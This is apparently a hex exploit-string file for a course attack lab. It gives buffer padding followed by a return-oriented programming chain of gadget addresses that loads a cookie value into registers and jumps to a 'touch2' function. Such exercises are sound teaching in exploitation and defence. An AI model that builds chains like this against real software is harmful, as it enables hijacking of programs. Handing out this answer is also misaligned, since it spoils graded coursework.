00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* buffer size */
77 1d 40 00 00 00 00 00  /* pop rbx */
1b cb 99 4e 00 00 00 00  /* cookie */
4e 1d 40 00 00 00 00 00  /* rbx to rdi */
7f 1d 40 00 00 00 00 00  /* pop rdx */
51 61 cd eb 00 00 00 00  /* cookie*3 */
c6 1d 40 00 00 00 00 00  /* rdx to rcx */
6a 1d 40 00 00 00 00 00  /* rcx to rsi */
36 1a 40 00 00 00 00 00  /* touch2 */
